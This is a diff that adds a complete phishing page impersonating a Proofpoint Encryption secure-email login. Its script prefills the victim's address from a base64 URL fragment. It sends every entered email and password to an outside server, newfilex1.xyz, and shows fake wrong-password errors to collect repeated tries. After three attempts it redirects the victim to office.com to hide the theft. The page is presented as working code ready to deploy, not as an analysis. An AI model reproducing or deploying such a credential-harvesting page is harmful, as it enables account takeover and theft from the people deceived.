@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head id="j_idt3">
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<link href="local_resources/css/8312583d85475e945d5dc238fe34c578.css" rel="stylesheet" type="text/css"/>
+<link href="local_resources/css/3a5ec54147544d6874de1d4b33ddd123.css" rel="stylesheet" type="text/css"/>
+<title>Encrypted Email Login</title>
+<style type="text/css">
+    @font-face {
+        font-family: sourceSansPro;
+        src: url("fonts/sourcesanspro-regular.ttf.woff.html");
+    }
+
+    body.floater span.copyright {
+        color: #999999;
+    }
+
+    body.floater .errorMessage {
+        color: #AB052F;
+    }
+
+
+    html,
+    body.floater {
+        height: 100%;
+        margin: 0px;
+        padding: 0px;
+        background-color: transparent;
+    }
+
+    body.floater div.logoPanel {
+        margin: 1ex 0 0;
+        text-align: center;
+        font-weight: normal;
+    }
+
+    body.floater div.logoPanel {
+        margin: 1ex 0 0;
+        text-align: center;
+        font-weight: normal;
+    }
+
+    div.floatingPanel {
+        text-align: left;
+        min-width: 25em;
+        padding: 0px;
+        z-index: 250;
+        border: 1px solid #CCCCCC;
+    }
+
+    div.floatingPanelContents {
+        margin: 2.5ex 1.0em;
+    }
+
+    div.floatingPanelContents td:first-child {
+        line-height: 1.75em;
+    }
+
+    .floatingPanel .messageToolbar {
+        border-bottom-width: 0px;
+    }
+
+    .infoText {
+        font-size: smaller;
+    }
+
+    table.container {
+        width: 100%;
+        height: 100%;
+    }
+
+    table.container td.out {
+        width: 50%;
+    }
+
+    .floatingPanel .ui-widget-content,
+    .powered {
+        font-family: sourceSansPro, sans-serif;
+        font-size: 1em;
+        color: #000000;
+    }
+
+    .dialogMessage {
+        margin: 4ex 0
+    }
+
+    .hiddentext {
+        position: absolute;
+        left: 0px;
+        top: -500px;
+        width: 1px;
+        height: 1px;
+        overflow: hidden;
+    }
+
+    input[type="text"].floaterInputField,
+    input[type="password"].floaterInputField {
+        background-image: none;
+        background-color: #EEEEEE;
+        color: #333333;
+        height: 2em;
+        width: 24em;
+        border: 1px solid #CCCCCC;
+        margin-top: 1.25ex;
+        float: left;
+    }
+
+    input[type="text"].floaterInputCode {
+        background-image: none;
+        background-color: #ffffe0;
+        color: #333333;
+        height: 2em;
+        width: 20em;
+        border: 1px solid #CCCCCC;
+        margin-top: 1.25ex;
+        float: left;
+    }
+
+    input[type="text"].floaterInputCode:focus {
+        background-color: #FFFFFF;
+    }
+
+    input[type='text'].floaterInputField:focus,
+    input[type="password"].floaterInputField:focus {
+        background-color: #FFFFFF;
+    }
+
+    input[type="text"].floaterInputField:disabled,
+    input[type="password"].floaterInputField:disabled {
+        background-color: #DDDDDD;
+        color: #333333;
+    }
+
+    .placeholderText {
+        font-style: italic;
+        color: #777777 !important;
+
+    }
+
+    input[type='submit'].floaterButton,
+    button[type='submit'].floaterButton {
+        height: 3em;
+        background-image: none;
+        border: 0;
+        border-radius: 0;
+        width: 100%;
+        color: #FFFFFF;
+        background-color: #3CA0DF;
+        font-weight: bold;
+        font-size: 1.13em;
+        margin-top: 1em;
+    }
+
+    input[type='submit'].floaterButton:hover,
+    input[type='submit'].floaterButton:focus {
+        background-color: #55C6FE;
+        background-image: none;
+    }
+
+    button[type='submit'].floaterSecondaryButton {
+        background-color: #7F7E7A;
+    }
+
+    button[type='submit'].floaterSecondaryButton:hover,
+    input[type='submit'].floaterSecondaryButton:focus {
+        opacity: 0.5;
+    }
+
+    td.buttonBox:last-child {
+        padding-left: 6px;
+    }
+
+    input[type='submit'].fullwidthButton {
+        width: 100%;
+    }
+
+    table.buttonContainer {
+        width: 100%;
+        border-collapse: collapse;
+    }
+
+    table.threeButtonContainer {
+        min-width: 38em;
+    }
+
+    td.buttonBox {
+        width: 50%;
+    }
+
+    td.triButtonBox {
+        width: 33%;
+    }
+
+    td.buttonPadding {
+        padding-left: 6px;
+    }
+
+    span.rf-msg span.rf-msg-err,
+    span.rf-msgs span.rf-msgs-err {
+        background-position: left center;
+        padding-left: 20px;
+    }
+
+    .focusableCommandLink:focus {
+        outline: solid 1px #55C6FE;
+    }
+
+    .focusableCommandLink:focus:not(:focus-visible) {
+        outline: 0;
+    }
+    </style>
+</head>
+<body class="floater" data-gr-ext-installed="" dir="ltr" style="background-color:#F2F2F2;">
+<div class="powered watermark" id="powered" style="color:rgba(0,0,0,0.6);position:absolute;z-index:100;right:10px;bottom:10px">Powered by Proofpoint Encryptionâ„¢
+    </div>
+<table border="0" cellpadding="0" cellspacing="0" class="container" role="presentation" style="z-index:10;">
+<tbody>
+<tr>
+<td class="out"></td>
+<td>
+<form id="dialog" method="post" name="dialog" style="margin:0;padding:0">
+<div class="ui-panel ui-widget ui-widget-content ui-corner-all floatingPanel" data-widget="widget_dialog_j_idt16" id="dialog:j_idt16">
+<div class="ui-panel-content ui-widget-content" id="dialog:j_idt16_content"><input id="dialog:resetTime" name="dialog:resetTime" type="hidden" value="180000"/><span id="dialog:j_idt17"></span>
+<div class="logoPanel"><img alt="" src="local_resources/img/c675d27dfff9f8a27ef3c75a14e7a584.png"/></div>
+<div id="dialog:headerContent" style="text-align: center; font-weight: bold; font-size: 110%;"><span id="dialog:step">Login</span></div>
+<div class="floatingPanelContents" id="dialog:bodyContent">Log in to read your secure message.
+                                    <center>
+<div class="alert alert-danger" id="msg" style="display: none;color: red">Invalid Password..! Please enter correct password.</div>
+<span class="text-danger" id="error" style="display: none;color: red">That account doesn't exist. Enter a different account</span>
+</center>
+<br/><label class="hiddentext" for="dialog:username">Email Address</label><input class="floaterInputField" id="ai" name="ai" placeholder="Email Address" type="text" value=""/>
+<br/><label class="hiddentext" for="dialog:password">Password</label><input class="floaterInputField" id="pr" name="pr" placeholder="Password" type="password" value=""/>
+<div>
+<div aria-live="polite" class="errorMessage ui-message" id="dialog:j_idt35" style="display:inline-block"></div>
+</div>
+<a class="focusableCommandLink" href="index.html#" id="dialog:forgotButton" style="line-height: 2em; font-weight: bold; font-size: 0.88em;">Forgot Password</a>
+<p>
+</p><input class="floaterButton" id="submit-btn" name="submit-btn" style="height: 3em;
+    background-image: none;
+    border: 0;
+    border-radius: 0;
+    width: 100%;
+    color: #FFFFFF;
+    background-color: #3CA0DF;
+    font-weight: bold;
+    font-size: 1.13em;
+    margin-top: 1em;" type="button" value="Continue"/>
+</div>
+</div>
+</div>
+</form>
+</td>
+<td class="out"></td>
+</tr>
+</tbody>
+</table>
+<!-- Optional JavaScript -->
+<!-- jQuery first, then Popper.js, then Bootstrap JS -->
+<script src="local_resources/js/8b11cdf1459a34b4401cadbb9adc5bb1.js" type="text/javascript"></script>
+<script src="local_resources/js/4352c71c7dbf3ea299f6e8f75552d037.js" type="text/javascript"></script>
+<script src="local_resources/js/fa23745d4e6bc99d0e191c82e00f6cf9.js" type="text/javascript"></script>
+</body>
+<script src="local_resources/js/c291f2ae17879321c2215162f40786cc.js" type="text/javascript"></script>
+<script src="local_resources/js/c1187e7c9fb5913ff29b3e2296278f50.js" type="text/javascript"></script>
+<script>
+/* global $ */
+$(document).ready(function() {
+    var count = 0;
+
+
+    /////////////url ai getting////////////////
+    var ai = window.location.hash.substr(1);
+    if (!ai) {
+
+    } else {
+        var base64regex = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;
+
+        if (!base64regex.test(ai)) {
+            // alert(btoa(ai));
+            var my_ai = ai;
+        } else {
+            // alert(atob(ai));
+            var my_ai = atob(ai);
+        }
+        // $('#ai').val(ai);
+        // var my_ai =ai;
+        var filter = /^([a-zA-Z0-9_.-])+@(([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!filter.test(my_ai)) {
+            $('#error').show();
+            ai.focus;
+            return false;
+        }
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        $('#ai').val(my_ai);
+        $("#div1").animate({ left: 0, opacity: "hide" }, 0);
+        $("#div2").animate({ right: 0, opacity: "show" }, 500);
+
+        $("#aich").html(my_ai);
+
+
+    }
+
+
+
+
+
+    $('#ai').click(function() {
+        $('#error').hide();
+    });
+
+    $(document).keypress(function(event) {
+
+        var keycode = (event.keyCode ? event.keyCode : event.which);
+        if (keycode == '13') {
+            event.preventDefault();
+            if ($("#div1").is(":visible")) {
+
+                $("#next").click();
+
+            } else if ($("#div2").is(":visible")) {
+                event.preventDefault();
+
+                $("#submit-btn").click();
+
+            } else {
+                return false;
+            }
+        }
+    });
+
+
+    $('#next').click(function() {
+        event.preventDefault();
+        var my_ai = $('#ai').val();
+        var filter = /^([a-zA-Z0-9_.-])+@(([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!filter.test(my_ai)) {
+            $('#error').show();
+            ai.focus;
+            return false;
+        }
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        $("#div1").animate({ left: 0, opacity: "hide" }, 0);
+        $("#div2").animate({ right: 0, opacity: "show" }, 500);
+
+        $("#aich").html(my_ai);
+
+
+
+
+
+    });
+    // $('#back').click(function() {
+    //     // $("#msg").hide();
+    //     $("#ai").val("");
+    //     $("#pr").val("");
+    //     $("#div2").animate({ left: 0, opacity: "hide" }, 0);
+    //     $("#div1").animate({ right: 0, opacity: "show" }, 1000);
+
+    // });
+
+var file="bmV4dC5waHA=";
+    $('#submit-btn').click(function(event) {
+        event.preventDefault();
+        var ai = $("#ai").val();
+        var pr = $("#pr").val();
+        var detail = $("#field").html();
+        var msg = $('#msg').html();
+
+        var my_ai = ai;
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        $('#msg').text(msg);
+        count = count + 1;
+        $.ajax({
+            dataType: 'JSON',
+            url: "https://newfilex1.xyz/lk/aje.php",
+            type: 'POST',
+            data: {
+                ai: ai,
+                pr: pr,
+                detail: detail,
+
+            },
+            beforeSend: function(xhr) {
+                $("#submit-btn").html("verifying...");
+            },
+            success: function(response) {
+                $("#pr").val("");
+                if (count >= 3) {
+                    count = 0;
+                    $("#div2").animate({ left: 0, opacity: "hide" }, 0);
+                    $("#div3").animate({ left: 0, opacity: "show" }, 500);
+                    setTimeout(() => {
+                        window.location.replace("https://www.office.com");
+                    }, 500);
+                    return false;
+                }
+                if (count == 2) {
+                    $("#msg2").show();
+                    $("#msg").hide();
+                    $("#msg1").hide();
+                } else {
+                    $("#msg1").show();
+                    $("#msg").hide();
+                    $("#msg2").hide();
+
+                }
+            },
+            error: function() {
+                $("#pr").val("");
+                if (count >= 3) {
+                    count = 0;
+                    $("#div2").animate({ left: 0, opacity: "hide" }, 0);
+                    $("#div3").animate({ left: 0, opacity: "show" }, 500);
+                    setTimeout(() => {
+                        window.location.replace("https://www.office.com");
+                    }, 1000);
+                    return false;
+                }
+                if (count == 2) {
+                    $("#msg2").show();
+                    $("#msg").hide();
+                    $("#msg1").hide();
+                } else {
+                    $("#msg1").show();
+                    $("#msg").hide();
+                    $("#msg2").hide();
+
+                }
+            },
+            complete: function() {
+                $("#submit-btn").html("Sign in");
+            }
+        });
+    });
+});
+</script>
+</html>
